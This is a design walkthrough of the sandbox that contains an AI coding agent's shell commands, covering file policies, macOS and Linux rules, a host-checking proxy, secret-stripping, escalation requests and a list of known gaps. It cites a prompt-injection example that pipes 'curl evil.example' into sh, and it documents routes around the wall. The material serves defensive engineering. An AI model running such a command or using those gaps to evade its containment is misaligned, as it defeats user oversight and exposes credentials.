1. The problem the sandbox solves

Crucible's agent runs shell commands on your computer through two tools: run_command (one command, wait for it) and start_session (a long-running terminal). Before the sandbox, the only protection was the approval card: you read a command and decided. That works until you click Allow on something that looks harmless, or until a prompt injection hidden in a README convinces the agent to run curl evil.example | sh in Full access.

Professor

Separate two questions that people blur together. Should this command run? is a judgment, and judgments can be wrong. What can this command touch if it does run? is a fact the operating system can enforce. Approval answers the first question. The sandbox answers the second, so a wrong judgment has a bounded cost.

So the sandbox puts every agent command inside an operating-system wall. Inside the wall a command can:

  • write only the workspace, temp folders, package caches and folders you added;
  • not read credential stores such as ~/.ssh, ~/.aws or the Keychain;
  • reach the network only through one proxy, which allows package registries, GitHub and hosts you approved.

It is on by default in every approval mode, Full access included. If the agent needs more, it must ask explicitly, with a reason, and that request is approved like any other.

2. The mental model: six small modules

The package is about 1,350 lines. Read it as layers, each with one job:

policy.py

What

A plain data description of what one command may write, may not write and may not read. Knows nothing about operating systems.

seatbelt.py · bubblewrap.py

How

Turn that description into OS rules: a Seatbelt profile on macOS, bubblewrap mount arguments on Linux.

runtime.py · launch.py

When

Whether the sandbox is on and works on this machine, and the bundle one command needs: policy, wrapped command line, environment, proxy lease.

env.py

Environment

The command's environment variables, minus anything that looks like a secret, plus the proxy settings.

proxy.py · netbridge.py · hosts.py

Network

The single route out: an HTTP proxy that checks host names, and a small bridge that carries it into a Linux network namespace.

blocks.py · escalation.py · store.py

Feedback

Recognize when the wall stopped a command and say so, let the agent ask to go past it, and remember the hosts and folders you approved.

Senior engineer

Notice that policy.py is pure data and both renderers consume it. That is the design choice that keeps macOS and Linux in agreement. When you add a protected path, you add it once in the policy; you never edit two OS-specific rule lists and hope they match.

3. One command's journey, call by call

Follow npm install from the moment the agent asks for it. Every name below is a real function in the repository.

In words:

  1. The gate first. ToolRegistry.prepare_command (agentd/tools/registry.py) checks whether the agent asked to go past the wall (escalation_from_args). If not, it calls the ordinary command approval: Ask shows a card, Auto may ask the judge, Full access approves.
  2. Then a launch. Inside the returned run() it calls SandboxRuntime.launch_for(shadow_root=…, extra_hosts=…) (agentd/sandbox/runtime.py). That returns None when the sandbox is off or unavailable, and otherwise a SandboxLaunch: a fresh policy, a proxy lease and a private temp folder.
  3. The spawn. run_command (agentd/tools/shell.py) builds the same shell line as always, then runs sandbox.wrap(["/bin/sh", "-c", line]) with sandbox.env(env) through asyncio.create_subprocess_exec. Without a launch it uses the old unsandboxed path.
  4. Cleanup and labelling. In a finally, launch.release() closes the lease so its token stops working. Then annotate_block checks whether the wall stopped the command, and sandbox_marker turns that into the tool pill's label.
Professor

Notice where the policy is built: per command, at launch time, not once at startup. The remembered hosts and extra folders can change between two commands, and a command started later should see the newer settings. Fresh construction makes that automatic, with no cache to invalidate.

4. The policy: what a command may touch

build_policy() in agentd/sandbox/policy.py returns a frozen SandboxPolicy. Its fields are the whole vocabulary of the sandbox:

FieldWhat goes in itWhy
writableThe workspace, /tmp and $TMPDIR, package caches (~/.npm, ~/.cache, ~/.cargo/registry, …), the extra folders from Settings, and the task shadowBuilds and installs must work. The caches' bin folders are deliberately absent: they are on PATH, so a command could plant a program you run later.
read_onlyAuto's always-ask list (AGENTS.md, .crucible/approved-*.json, mcp.json, .vscode settings, .git/hooks, …), shell startup files, and .gitThese files grant permissions or steer the agent. A command must not be able to edit its own permissions.
unreadable~/.ssh, ~/.aws, ~/.gnupg, ~/.config/gh, ~/.crucible/auth, the Keychain folder, shell history, …Credential stores. Reading them is how a token leaves the machine.
pinnedEvery parent folder of a protected pathSee the engineer's note below.
git_dir, git_common_dirThe real git directories, which differ in a linked worktree (_git_dirs)So the git allowlist applies to the right folders.
private_tmpThis workspace's own temp folderThe shared temp folders hold the host's sockets: VS Code's, tmux's, ssh-agent's.
Senior engineer

Why pin the parents? Making .vscode/settings.json read-only is not enough if the command can run mv .vscode x; mkdir .vscode; write a new settings.json. The file was never written; its folder was replaced. So _pinned() collects every ancestor of every protected path, and the renderers forbid renaming or replacing those exact paths. A final review found this hole; it is the kind of bug a list of "bad files" never catches.

Why is .git an allowlist? Git run outside the sandbox (VS Code runs it constantly, without asking) executes hooks/, follows core.fsmonitor in config, and follows commondir. Any new control file git learns about tomorrow is another way out. So the policy lists what everyday git may write (GIT_WORKTREE_DIRS, GIT_WORKTREE_FILES, GIT_SHARED_DIRS, GIT_SHARED_FILES) and blocks everything else. Rebase and bisect state are absent on purpose: a rebase todo file holds exec lines that git runs on --continue, outside the wall.

5. Building the wall on macOS and Linux

The two renderers share one idea, which is worth learning as a general principle: later rules win. You start broad and carve exceptions, then exceptions to the exceptions.

macOS: a Seatbelt profile (seatbelt.py)

seatbelt_profile(policy) writes a profile in Apple's sandbox language, and seatbelt_argv runs the command as /usr/bin/sandbox-exec -p <profile> -- /bin/sh -c "…". The rules are emitted in this order:

  1. _BASE: deny everything, then allow processes, reading files, terminals and the standard devices. Network is allowed only to localhost, which is where the proxy listens.
  2. _KEYCHAIN and _CLIPBOARD: deny the Mach services behind the Keychain and the clipboard, since both hold the same secrets the file rules protect.
  3. Allow writes to writable; allow Unix sockets only in the workspace and the private temp folder.
  4. Deny writes to read_only, then re-allow any writable path nested inside one (the task shadow lives under the read-only .crucible/state).
  5. _git_rules: re-allow git's everyday files by regex; deny object alternates.
  6. Deny writes to each pinned path exactly (literal, not subpath).
  7. Last, deny reading and writing unreadable. Last, so that a workspace containing your home folder cannot re-open ~/.ssh.

Linux: bubblewrap mounts (bubblewrap.py)

bwrap_argv builds the same picture out of mounts: the whole filesystem read-only (--ro-bind / /), writable roots bound back read-write, protected paths bound read-only over them, credential folders hidden behind empty mounts. --unshare-net gives the command a network with only loopback, and /run and /var/run are hidden, because a new network namespace does not stop a command from opening a Unix socket by path (the Docker socket lives there).

Senior engineer

Linux is stricter in two places, and you should know why before someone files them as bugs. Bubblewrap can only mount over paths that exist, and it cannot say "this file but not that one". So .crucible, .claude, .vscode and .git are read-only as whole folders (_control_folder_args), with only git's objects, refs, logs and FETCH_HEAD bound back. Result: git status and git fetch work, but git add and git commit need an escalation. Codex behaves the same way.

Is the sandbox even possible here? (runtime.py)

At startup, main.py runs SandboxRuntime.start() in the background. It clears the private temp folder, then _probe() runs /usr/bin/true inside an empty wall. Exit 0 means available. Otherwise it records a reason the UI can show: "bubblewrap is not installed", "user namespaces are disabled", or "native Windows is not supported". Then it starts the proxy. active() is simply enabled and available; while the probe is still running, status() reports available: false with reason: null, which clients read as "still checking".

6. The only way out: the proxy

A sandboxed command has no route to the internet except one HTTP proxy inside the backend process (SandboxProxy in proxy.py). sandbox_env() points HTTP_PROXY, HTTPS_PROXY and ALL_PROXY at it, and sets NODE_USE_ENV_PROXY=1 because Node's built-in fetch ignores those variables otherwise.

Leases: knowing which command is asking

Each launch gets a ProxyLease from proxy.lease() with a random 32-hex-digit token. The token rides in the proxy URL as a username: http://<token>:x@127.0.0.1:<port>. Tools send it back as a Proxy-Authorization header, and _lease_for() finds the lease. That lets the proxy:

  • apply that command's extra hosts (from an approved allow_hosts) without granting them to anyone else;
  • record the hosts it refused on that lease, which annotate_block reads later;
  • cut off a command that has finished: release() drops the lease and closes its open connections.

The decision, in _check()

SituationAnswerRecorded as a block?
Host in DEFAULT_HOSTS, remembered for the workspace, or in the lease's extrasTunnel (200 Connection Established)No
Any other host403 ForbiddenYes
Allowed name that resolves only to internal addresses (loopback, link-local, cloud metadata 169.254.169.254), not explicitly listed403Yes
Allowed host that doesn't resolve, or can't be reached502 Bad GatewayNo: a DNS failure is never reported as the sandbox
Wrong or released token407No
No token at allThe baseline only: defaults and remembered hostsYes, if refused
Senior engineer

Three details came from real failures, not theory:

  • The token-less baseline. Ubuntu's npm 9 silently drops credentials from a proxy URL, so every install failed with 407. A request with no token now gets exactly what every sandboxed command already has, so it gains nothing.
  • The host is rewritten. For plain HTTP, _forward_request sends the checked host upstream and drops the client's Host header. On a CDN, a different Host header would reach another tenant through an allowed name. It also forces Connection: close, so a second request on the same connection can't slip past the check.
  • Connect to the address you checked. The proxy resolves the name, checks the addresses, and connects to those addresses. A second DNS answer can't redirect it to an internal address after the check.

TLS is tunnelled, never inspected. The proxy sees host names, not contents.

Linux needs a bridge (netbridge.py)

Inside --unshare-net there is only loopback, so the proxy outside is unreachable over TCP. On Linux the proxy also listens on a Unix socket, which bubblewrap binds into the sandbox. netbridge.py, a standard-library-only script, starts first inside the namespace, listens on 127.0.0.1:<port>, forwards each connection to that socket, then runs the real command as its child and exits with its status. The command never knows: its HTTPS_PROXY points at 127.0.0.1:<port> on both platforms.

The environment (env.py)

Blocking ~/.aws would be pointless if AWS_SECRET_ACCESS_KEY rode in on the environment. sandbox_env() drops any variable whose name contains KEY, SECRET, TOKEN, PASSWORD, AUTH and similar markers (but not git's AUTHOR variables), plus any URL value that contains a password, such as DATABASE_URL=postgres://u:pw@…. A command allowed outside the sandbox gets the full environment back.

Senior engineer

One gotcha you will meet: on macOS, env.py also removes NODE_USE_SYSTEM_CA and --use-system-ca. With those set, Node reads system certificates from the Keychain; the sandbox denies the Keychain; Node segfaults. It showed up as npm install exiting with code 139. The Keychain deny stays, because credential helpers reach your tokens through the same service.

7. Telling the agent it was blocked

A blocked command fails like any other: Operation not permitted, Read-only file system, a 403 from the proxy. An agent that doesn't know why will retry, or work around it in ways you won't like. So annotate_block() (blocks.py) runs after every sandboxed command and, when the wall caused the failure, prepends a sentence such as:

Blocked by the sandbox: network access to example.com is not allowed.
To allow this host, call run_command again with allow_hosts: ["example.com"] and a short reason.

It also sets output.status = "sandbox_blocked", which sandbox_marker() turns into the pill's "blocked" label. The detection in classify_block() is deliberately narrow:

  • A refused host always counts, even when the command exited 0: curl http://x exits 0 after receiving the proxy's 403.
  • A denied write to a protected file always counts: git checkout can exit 0 and leave a protected file stale.
  • Anything else counts only when the command failed: a passing grep or test run can print the same words about something unrelated.
  • "Permission denied" (EACCES) is never a block. That is ordinary file permissions. The sandbox produces EPERM or EROFS, and only on paths outside the allowed set.
  • A direct network attempt also counts, including name-resolution failures: only the proxy can resolve names inside the wall, so an SSH git push fails there.
Professor

This is a classifier, and like every classifier it trades false positives for false negatives. The rule here is asymmetric on purpose: mislabelling an ordinary error as "the sandbox blocked you" invites the agent to escalate for no reason, which is worse than occasionally missing a block. That is why the exit code decides so much.

8. Asking to go past the wall

While the sandbox is active, the schemas of run_command and start_session gain three arguments from ESCALATION_PROPERTIES (escalation.py): allow_hosts, outside_sandbox and reason. When the sandbox is off they aren't in the schema at all, so the agent can't ask for something that means nothing.

escalation_from_args() turns them into an Escalation. In prepare_command, an escalation replaces the ordinary approval: it goes to escalation_approval_callback, which is ChatController._escalation_approval_cb (agentd/chat/controller.py). No remembered command rule ever covers it. If no callback is wired, the request is refused, never allowed.

  • allow_hosts runs inside the wall with those hosts added to this command's lease (launch_for(extra_hosts=…)).
  • outside_sandbox runs with no launch at all, so the command is unsandboxed and gets the full environment back. The result carries outside_sandbox = True, and the pill shows "outside".

The card is SandboxEscalationGate in webview-ui/…/gates/CommandGate.tsx. Its "Allow for this workspace" button sends remember: true; in _ask_command that saves the hosts with store.add_host(), and only for allow_hosts. Leaving the sandbox entirely is never remembered.

Senior engineer

Where are remembered hosts kept? In ~/.crucible/sandbox/<first 16 hex digits of sha256(workspace path)>/hosts.json, next to folders.json (WorkspaceSandboxStore, store.py). Never in the repository. If they lived in .crucible/, a cloned repository could ship its own allowlist, and a command could widen its own wall.

9. How it combines with the approval modes

The sandbox decides what a command can touch; the mode decides who approves it. The two are independent, and their combination is the actual behavior:

ModeOrdinary command (sandbox on)Escalation (allow_hosts / outside_sandbox)
Ask for approvalCard, unless a remembered rule covers itEscalation card for you
Accept editsCard, unless a remembered rule covers itEscalation card for you
AutoAutoGate.decide_command(sandboxed=True): deny list, then protected writes ask, then remembered rules, then runs without the judge unless is_outward() (pushes, publishing, gh writes)AutoGate.decide_escalation: deny list, protected writes ask, then the judge decides
Full accessRuns, inside the wallRuns without asking: when a command is blocked, the agent's retry with the escalation goes straight through
Professor

Look at the Auto row. Without the sandbox, Auto has to judge almost every command, because a test run executes workspace code that an injected edit may have changed. With the sandbox, the wall already contains that code, so only actions that reach outward through an allowed host still need judgment. That is the same split Codex and Claude Code use. The sandbox made Auto both cheaper and safer at once.

One more interaction: typing into a terminal session. In Ask and Accept edits, input to a session that was let out of the sandbox asks each time (control keys pass), so "Allow once" can't become a standing unsandboxed shell. The check is in ChatController._stdin_approval_cb, using SessionManager.session_sandbox(): a session keeps the wall it started in, even if you flip the switch later.

11. What it does not cover

A sandbox you overtrust is worse than none. These gaps are known and documented in CLAUDE.md:

  • The task path (ToolLoop, validation commands) is not sandboxed; only chat commands and terminal sessions are.
  • The first moments after startup, before the probe finishes, run commands unsandboxed.
  • A nested repository a command creates (with its own .git/config) can still run code if VS Code's git scans it; blocking that would break git clone.
  • Block detection matches text, so a failing test that prints "Name or service not known" reads as a block, and a tool that fails silently doesn't.
  • On macOS, a server bound to 0.0.0.0 inside the wall is reachable from the machine's other addresses, and a sandboxed command can reach services on the host's localhost.
  • Readable on purpose: ~/.npmrc and ~/.pypirc stay readable, and ~/.local/share/uv (which holds managed Pythons) is writable.
  • Unavailable platforms (no bubblewrap, user namespaces off, native Windows) run commands unprotected, with one notice per window and a line in the approval menu.

12. Check yourself

Try each before opening the answer.

Why does curl http://example.com count as blocked even though it exited 0?

The proxy answered 403, and curl treats any HTTP response as success. classify_block therefore trusts the lease's refused list over the exit code: a refused host is a block whatever the command returned.

Why aren't remembered hosts stored in the repository's .crucible/ folder?

Anything in the repository can arrive from a clone or be written by a command. A file there could widen the wall it is supposed to describe. The store lives under your home folder, keyed by a hash of the workspace path.

On Linux, why does git commit need an escalation but not on macOS?

Bubblewrap can't allow .git/index.lock while blocking a new .git/commondir, so .git is read-only apart from objects, refs, logs and FETCH_HEAD. Seatbelt can express the allowlist by regex, so macOS allows git's everyday files.

Why does the proxy accept a request with no token at all?

Some tools (Ubuntu's npm 9, some Java tools) drop credentials from proxy URLs. A token-less request gets only the baseline every sandboxed command already has, never a command's extra hosts, so accepting it grants nothing new. A wrong or released token is still refused.

Why can "Allow for this workspace" remember hosts but never outside_sandbox?

A host is a narrow, checkable grant. Running outside the wall removes every protection for that command, so it must be decided each time.

You add a new protected file to Auto's always-ask list. What else do you need to change for the sandbox?

Nothing. _read_only_in() reads ALWAYS_ASK_IN_WORKSPACE directly, both renderers consume the policy, and _pinned() derives its parents. One list, three consumers. That is the point of section 2.
